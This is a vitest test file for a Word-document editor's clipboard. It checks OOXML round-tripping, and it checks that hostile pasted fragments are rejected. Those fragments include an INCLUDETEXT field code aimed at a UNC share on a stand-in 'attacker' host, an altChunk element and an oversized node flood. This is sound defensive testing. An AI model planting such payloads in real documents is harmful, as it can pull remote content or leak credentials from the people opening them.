// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { DocxDocument } from "../src/docx.js";
import type { Paragraph, Run } from "../src/model.js";
import { serializeXml, type XmlElement } from "../src/xml.js";
import type { SelectionSegment } from "../src/edit/commands.js";
import type { TextContent } from "../src/model.js";
import {
  clipboardBlocksHtml,
  decodeClipboardOoxml,
  extractClipboardOoxml,
  htmlClipboardBlocks,
  selectionClipboardBlocks,
} from "../src/edit/clipboard.js";
import { makeDocx, wrapDocument } from "./helpers.js";

/**
 * The clipboard carries real WordprocessingML.
 *
 * Copy used to put a JSON dump of the internal XmlElement tree in a data
 * attribute, and paste fed that JSON straight into the document with NO
 * validation — so a web page could hand this editor an altChunk or a field
 * code by writing the attribute itself. The fragment is now OOXML, and the
 * internal round trip goes through the same gate an external paste faces.
 */

const W_NS = "http://schemas.openxmlformats.org/wordprocessingml/2006/main";

function loadDoc(body: string): DocxDocument {
  return DocxDocument.load(makeDocx({ "word/document.xml": wrapDocument(body) }));
}

function segFor(run: Run, start: number, end: number): SelectionSegment {
  const t = (run.content.find((c) => c.kind === "text") as TextContent | undefined)?.srcT ?? null;
  return { run, t: t as SelectionSegment["t"], start, end, props: run.props };
}

/** Every run of a paragraph, selected whole — what a copy of that paragraph
 * hands selectionClipboardBlocks. */
function wholeParagraph(doc: DocxDocument, index: number): SelectionSegment[] {
  const para = doc.sections[0].blocks[index] as Paragraph;
  const runs = para.children.flatMap((c) => (c.type === "run" ? [c] : c.runs));
  return runs.map((run) => {
    const text = run.content.find((c) => c.kind === "text") as TextContent | undefined;
    return segFor(run, 0, text?.text.length ?? 0);
  });
}

/** Copy, then paste: the full trip a user makes with two keystrokes. */
function roundTrip(doc: DocxDocument, segments: SelectionSegment[]): XmlElement[] {
  return htmlClipboardBlocks(clipboardBlocksHtml(selectionClipboardBlocks(doc, segments)), 624);
}

const xmlOf = (blocks: XmlElement[]): string => blocks.map((b) => serializeXml(b)).join("");

describe("clipboard OOXML fragment", () => {
  it("carries a parseable WordprocessingML main part in the HTML payload", () => {
    const doc = loadDoc(`<w:p><w:r><w:rPr><w:b/></w:rPr><w:t xml:space="preserve">bold</w:t></w:r></w:p>`);
    const html = clipboardBlocksHtml(selectionClipboardBlocks(doc, wholeParagraph(doc, 0)));

    // The HTML rendering still stands on its own for apps that ignore us.
    expect(html).toContain("font-weight:bold");
    // …and a desktop shell can lift a complete document part out of it.
    const fragment = extractClipboardOoxml(html)!;
    expect(fragment).toContain(`<w:document xmlns:w="${W_NS}">`);
    expect(fragment).toContain("<w:body>");
    expect(fragment).toContain(`<w:t xml:space="preserve">bold</w:t>`);
    expect(fragment).toContain("<w:b/>");
  });

  it("round-trips run and paragraph formatting through the fragment, not the HTML", () => {
    const doc = loadDoc(
      `<w:p><w:pPr><w:jc w:val="center"/><w:ind w:left="720"/></w:pPr>` +
        `<w:r><w:rPr><w:i/><w:sz w:val="28"/><w:rFonts w:ascii="Georgia" w:hAnsi="Georgia"/></w:rPr>` +
        `<w:t xml:space="preserve">styled</w:t></w:r></w:p>`,
    );
    const xml = xmlOf(roundTrip(doc, wholeParagraph(doc, 0)));
    // The semantic HTML rendering knows nothing about indent, size or font;
    // everything below survives only because the fragment is the source.
    expect(xml).toContain(`<w:jc w:val="center"/>`);
    expect(xml).toContain(`<w:ind w:left="720"/>`);
    expect(xml).toContain(`<w:sz w:val="28"/>`);
    expect(xml).toContain(`w:ascii="Georgia"`);
    expect(xml).toContain("<w:i/>");
    expect(xml).toContain("styled");
  });

  it("round-trips a table with its geometry", () => {
    const doc = loadDoc(
      `<w:tbl><w:tblPr><w:tblW w:w="5000" w:type="dxa"/>` +
        `<w:tblLook w:val="04A0" w:firstRow="1" w:noVBand="1"/></w:tblPr>` +
        `<w:tblGrid><w:gridCol w:w="2500"/><w:gridCol w:w="2500"/></w:tblGrid>` +
        `<w:tr><w:tc><w:tcPr><w:tcW w:w="2500" w:type="dxa"/><w:shd w:val="clear" w:fill="FFFF00"/></w:tcPr>` +
        `<w:p><w:r><w:t xml:space="preserve">left</w:t></w:r></w:p></w:tc>` +
        `<w:tc><w:tcPr><w:tcW w:w="2500" w:type="dxa"/></w:tcPr>` +
        `<w:p><w:r><w:t xml:space="preserve">right</w:t></w:r></w:p></w:tc></w:tr></w:tbl>` +
        `<w:p><w:r><w:t xml:space="preserve">after</w:t></w:r></w:p>`,
    );
    const para = doc.sections[0].blocks[0];
    expect(para.type).toBe("table");
    const cellRuns = doc.sections[0].blocks
      .filter((b) => b.type === "table")
      .flatMap((t) => (t.type === "table" ? t.rows : []))
      .flatMap((row) => row.cells)
      .flatMap((cell) => cell.blocks)
      .flatMap((block) => (block.type === "paragraph" ? block.children : []))
      .flatMap((c) => (c.type === "run" ? [c] : c.runs));
    const segments = cellRuns.map((run) => {
      const text = run.content.find((c) => c.kind === "text") as TextContent | undefined;
      return segFor(run, 0, text?.text.length ?? 0);
    });

    const xml = xmlOf(roundTrip(doc, segments));
    expect(xml).toContain("<w:tbl>");
    expect(xml).toContain(`<w:gridCol w:w="2500"/>`);
    expect(xml).toContain(`<w:tcW w:w="2500" w:type="dxa"/>`);
    expect(xml).toContain(`<w:shd w:val="clear" w:fill="FFFF00"/>`);
    expect(xml).toContain("left");
    expect(xml).toContain("right");
    // The un-selected paragraph after the table stays out of the copy.
    expect(xml).not.toContain("after");
  });

  it("strips per-paragraph identifiers so a paste cannot duplicate them", () => {
    const body =
      `<w:p w14:paraId="11112222" w14:textId="33334444" w:rsidR="00AB12CD">` +
      `<w:r w:rsidRPr="00AB12CD"><w:t xml:space="preserve">once</w:t></w:r></w:p>`;
    const documentXml =
      `<?xml version="1.0"?><w:document xmlns:w="${W_NS}"` +
      ` xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml"><w:body>${body}</w:body></w:document>`;
    const doc = DocxDocument.load(makeDocx({ "word/document.xml": documentXml }));

    const xml = xmlOf(roundTrip(doc, wholeParagraph(doc, 0)));
    expect(xml).toContain("once");
    expect(xml).not.toContain("paraId");
    expect(xml).not.toContain("textId");
    expect(xml).not.toContain("rsid");
  });

  it("drops a drawing but keeps the text beside it", () => {
    const doc = loadDoc(
      `<w:tbl><w:tblGrid><w:gridCol w:w="5000"/></w:tblGrid><w:tr><w:tc>` +
        `<w:p><w:r><w:drawing><wp:inline xmlns:wp="http://x"/></w:drawing></w:r>` +
        `<w:r><w:t xml:space="preserve">caption</w:t></w:r></w:p></w:tc></w:tr></w:tbl>`,
    );
    const runs = doc.sections[0].blocks
      .flatMap((b) => (b.type === "table" ? b.rows : []))
      .flatMap((row) => row.cells)
      .flatMap((cell) => cell.blocks)
      .flatMap((block) => (block.type === "paragraph" ? block.children : []))
      .flatMap((c) => (c.type === "run" ? [c] : c.runs));
    const segments = runs.map((run) => {
      const text = run.content.find((c) => c.kind === "text") as TextContent | undefined;
      return text ? segFor(run, 0, text.text.length) : segFor(run, 0, 0);
    });
    const xml = xmlOf(roundTrip(doc, segments));
    expect(xml).toContain("caption");
    expect(xml).not.toContain("drawing");
  });
});

describe("pasting a hostile fragment", () => {
  const hostile = (fragmentXml: string, visible: string): string =>
    `<div data-dxw-ooxml="${encodeURIComponent(fragmentXml)}"><p>${visible}</p></div>`;

  it("refuses a fragment carrying a field code and falls back to the HTML", () => {
    const html = hostile(
      `<w:document xmlns:w="${W_NS}"><w:body><w:p><w:r>` +
        `<w:instrText> INCLUDETEXT "\\\\attacker\\share\\x.docx" </w:instrText>` +
        `</w:r></w:p></w:body></w:document>`,
      "innocent",
    );
    const xml = xmlOf(htmlClipboardBlocks(html, 624));
    expect(xml).not.toContain("INCLUDETEXT");
    expect(xml).not.toContain("instrText");
    expect(xml).toContain("innocent");
  });

  it("refuses a fragment carrying an altChunk", () => {
    const html = hostile(
      `<w:document xmlns:w="${W_NS}"><w:body>` +
        `<w:p><w:altChunk r:id="rId9" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/></w:p>` +
        `</w:body></w:document>`,
      "innocent",
    );
    const xml = xmlOf(htmlClipboardBlocks(html, 624));
    expect(xml).not.toContain("altChunk");
    expect(xml).toContain("innocent");
  });

  it("refuses a fragment past the node cap instead of pasting it", () => {
    const huge = `<w:p><w:r><w:t xml:space="preserve">x</w:t></w:r></w:p>`.repeat(3000);
    const html = hostile(`<w:document xmlns:w="${W_NS}"><w:body>${huge}</w:body></w:document>`, "innocent");
    const blocks = htmlClipboardBlocks(html, 624);
    expect(blocks.length).toBe(1);
    expect(xmlOf(blocks)).toContain("innocent");
  });

  it("ignores an attribute that holds no blocks", () => {
    expect(decodeClipboardOoxml("not markup")).toEqual([]);
    expect(xmlOf(htmlClipboardBlocks(hostile("not markup", "innocent"), 624))).toContain("innocent");
  });

  it("ignores an attribute that is not decodable", () => {
    // A truncated percent escape makes decodeURIComponent throw.
    const html = `<div data-dxw-ooxml="%E0%A4%A"><p>innocent</p></div>`;
    expect(xmlOf(htmlClipboardBlocks(html, 624))).toContain("innocent");
  });

  it("still converts ordinary HTML from another application", () => {
    const xml = xmlOf(htmlClipboardBlocks("<p><b>hi</b> there</p>", 624));
    expect(xml).toContain("<w:b/>");
    expect(xml).toContain("hi");
    expect(xml).toContain(" there");
  });
});
